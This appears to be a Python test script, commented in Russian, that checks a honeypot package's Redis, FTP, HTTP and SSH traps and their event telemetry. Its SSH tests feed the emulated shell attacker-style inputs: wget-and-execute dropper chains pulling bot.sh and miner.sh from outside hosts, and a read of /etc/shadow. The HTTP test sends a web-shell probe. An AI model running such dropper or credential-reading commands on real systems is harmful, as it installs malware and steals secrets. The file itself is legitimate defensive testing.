#!/usr/bin/env python3
"""Скрипт быстрой проверки ловушек уровня Low и Medium."""
import asyncio
import os
import sys
from pathlib import Path
from unittest.mock import MagicMock

# Обеспечиваем доступ к пакету netsvc
sys.path.insert(0, str(Path(__file__).parent))

has_asyncssh = True
try:
    import asyncssh
except ImportError:
    has_asyncssh = False
    sys.modules["asyncssh"] = MagicMock()

from netsvc.buffer import EventBuffer
from netsvc.emitter import Emitter
from netsvc.traps.banner import BannerTrap
from netsvc.traps.http import HttpTrap
from netsvc.traps.ssh import _split_subcommands, FakeFS, Session


async def test_low_traps():
    print("=" * 60)
    print("1. ПРОВЕРКА LOW-INTERACTION ЛОВУШЕК (BannerTrap)")
    print("=" * 60)
    
    # 1.1 Тест Redis
    buf = EventBuffer(":memory:")
    trap = BannerTrap({"port": 0, "banner": "redis_version:6.0.9"}, {"logging": {"max_payload_bytes": 128}}, Emitter(buf))
    await trap.start("127.0.0.1")
    r, w = await asyncio.open_connection("127.0.0.1", trap.port)
    
    w.write(b"PING\r\n")
    await w.drain()
    resp_ping = await r.readline()
    assert resp_ping.strip() == b"+PONG", f"Ошибка Redis PING: {resp_ping}"
    print("  [+] Redis PING -> +PONG: OK")
    
    w.write(b"AUTH hacker_pass_123\r\n")
    await w.drain()
    resp_auth = await r.readline()
    assert resp_auth.strip() == b"+OK", f"Ошибка Redis AUTH: {resp_auth}"
    print("  [+] Redis AUTH hacker_pass_123 -> +OK (пароль перехвачен): OK")
    
    w.write(b"INFO\r\n")
    await w.drain()
    resp_info = await r.readline()
    assert resp_info.startswith(b"$"), f"Ошибка Redis INFO: {resp_info}"
    print("  [+] Redis INFO -> блок сведений сервера: OK")
    
    w.close()
    await asyncio.sleep(0.1)
    await trap.stop()
    
    evs = buf.peek(20)
    auth_ev = next((e for e in evs if e["type"] == "auth_attempt"), None)
    assert auth_ev and auth_ev["password"] == "hacker_pass_123"
    print("  [+] Телеметрия Low: зафиксировано событие auth_attempt с паролем: OK")

    # 1.2 Тест FTP
    buf_ftp = EventBuffer(":memory:")
    ftp = BannerTrap({"port": 0, "banner": "220 ProFTPD 1.3.5 Server ready"}, {"logging": {"max_payload_bytes": 128}}, Emitter(buf_ftp))
    await ftp.start("127.0.0.1")
    r2, w2 = await asyncio.open_connection("127.0.0.1", ftp.port)
    banner = await r2.readline()
    assert b"220 ProFTPD" in banner
    print("  [+] FTP приветственный баннер: OK")
    
    w2.write(b"USER admin\r\n")
    await w2.drain()
    u_resp = await r2.readline()
    assert b"331" in u_resp
    
    w2.write(b"PASS my_ftp_secret\r\n")
    await w2.drain()
    p_resp = await r2.readline()
    assert b"530" in p_resp
    print("  [+] FTP USER admin / PASS my_ftp_secret -> 530 (учётка перехвачена): OK")
    
    w2.close()
    await asyncio.sleep(0.1)
    await ftp.stop()
    evs_ftp = buf_ftp.peek(20)
    assert any(e["type"] == "auth_attempt" and e["username"] == "admin" and e["password"] == "my_ftp_secret" for e in evs_ftp)
    print("  [+] Телеметрия FTP: зафиксировано событие auth_attempt: OK")


async def test_medium_http():
    print("\n" + "=" * 60)
    print("2. ПРОВЕРКА MEDIUM-INTERACTION HTTP (HttpTrap)")
    print("=" * 60)
    
    buf = EventBuffer(":memory:")
    trap = HttpTrap({"port": 0}, {}, Emitter(buf))
    await trap.start("127.0.0.1")
    
    # 2.1 Проверка honeytoken /.env
    r, w = await asyncio.open_connection("127.0.0.1", trap.port)
    w.write(b"GET /.env HTTP/1.1\r\nHost: target\r\n\r\n")
    await w.drain()
    data_env = await r.read(4096)
    assert b"DB_PASSWORD=" in data_env and b"AWS_ACCESS_KEY_ID=" in data_env
    print("  [+] Honeytoken /.env: отданы ложные ключи AWS и БД: OK")
    w.close()
    
    # 2.2 Проверка honeytoken /.git/config
    r, w = await asyncio.open_connection("127.0.0.1", trap.port)
    w.write(b"GET /.git/config HTTP/1.1\r\nHost: target\r\n\r\n")
    await w.drain()
    data_git = await r.read(4096)
    assert b"repositoryformatversion" in data_git
    print("  [+] Honeytoken /.git/config: отдана ложная конфигурация репозитория: OK")
    w.close()

    # 2.3 Проверка веб-атаки (RCE probe)
    r, w = await asyncio.open_connection("127.0.0.1", trap.port)
    w.write(b"GET /shell.php?cmd=id HTTP/1.1\r\nHost: target\r\n\r\n")
    await w.drain()
    data_probe = await r.read(4096)
    assert b"404 Not Found" in data_probe
    print("  [+] Web-shell проба (?cmd=id) -> детектирована атака: OK")
    w.close()

    await asyncio.sleep(0.1)
    await trap.stop()
    
    evs = buf.peek(30)
    assert any(e["type"] == "honeytoken" and e["command"] == "/.env" for e in evs)
    assert any(e["type"] == "honeytoken" and e["command"] == "/.git/config" for e in evs)
    assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "web-attack-probe" for e in evs)
    print("  [+] Телеметрия HTTP: зафиксированы события honeytoken и web-attack-probe: OK")


def test_medium_ssh():
    print("\n" + "=" * 60)
    print("3. ПРОВЕРКА MEDIUM-INTERACTION SSH (SshTrap / Session)")
    print("=" * 60)
    
    # 3.1 Разбор цепочек команд
    subcmds = _split_subcommands("cd /tmp && wget http://1.2.3.4/bot.sh; chmod +x bot.sh; ./bot.sh")
    assert len(subcmds) == 4
    print("  [+] Разбор цепочек (&&, ;, ||): 4 подкоманды разобраны с сохранением операторов: OK")
    
    # 3.2 Файловая система и honeytokens
    fs = FakeFS("honeypot-srv", [])
    assert "/etc/shadow" in fs.files and "/proc/cpuinfo" in fs.files
    assert "/etc/shadow" in fs.honey
    print("  [+] FakeFS: файлы /etc/shadow, /proc/cpuinfo и маркеры honeytoken инициализированы: OK")

    # 3.3 Интерактивная эмуляция сессии
    buf = EventBuffer(":memory:")
    trap_mock = MagicMock()
    trap_mock.service = {"port": 2222}
    trap_mock.hostname = "srv-prod"
    trap_mock.emitter = Emitter(buf)
    trap_mock.fs = FakeFS("srv-prod", [])

    proc_mock = MagicMock()
    proc_mock.get_extra_info.side_effect = lambda k: "root" if k == "username" else ("100.64.0.14", 45678)
    proc_mock.get_terminal_type.return_value = None
    output_lines = []
    proc_mock.stdout.write.side_effect = lambda text: output_lines.append(text)

    sess = Session(trap_mock, proc_mock, "sid999")
    
    # Цепочка навигации
    sess.run("cd /tmp && pwd; whoami")
    out = "".join(output_lines)
    assert "/tmp\n" in out and "root\n" in out
    print("  [+] Выполнение цепочки 'cd /tmp && pwd; whoami': OK")

    # Разведка системы
    output_lines.clear()
    sess.run("lscpu; nproc; free -m; which wget")
    out = "".join(output_lines)
    assert "x86_64" in out and "2\n" in out and "Mem:" in out and "/bin/wget" in out
    print("  [+] Команды разведки 'lscpu; nproc; free -m; which wget': OK")

    # Чтение honeytoken /etc/shadow
    output_lines.clear()
    sess.run("cat /etc/shadow")
    out = "".join(output_lines)
    assert "root:$6$" in out
    print("  [+] Чтение /etc/shadow -> выданы ложные хэши паролей: OK")

    # Эмуляция дроппера
    output_lines.clear()
    sess.run("cd /tmp && wget http://malware.cc/miner.sh && chmod +x miner.sh && ./miner.sh")
    out = "".join(output_lines)
    assert "saved" in out
    print("  [+] Эмуляция дроппера 'wget ... && chmod +x ... && ./miner.sh' -> фиксация загрузки и запуска: OK")

    evs = buf.peek(30)
    assert any(e["type"] == "honeytoken" and "/etc/shadow" in e["command"] for e in evs)
    assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "download-attempt" for e in evs)
    assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "execution-attempt" for e in evs)
    print("  [+] Телеметрия SSH: зафиксированы события honeytoken, download-attempt, execution-attempt: OK")


async def main():
    await test_low_traps()
    await test_medium_http()
    test_medium_ssh()
    print("\n" + "=" * 60)
    print("🎉 ВСЕ ЛОВУШКИ УРОВНЕЙ LOW И MEDIUM УСПЕШНО ПРОВЕРЕНЫ!")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
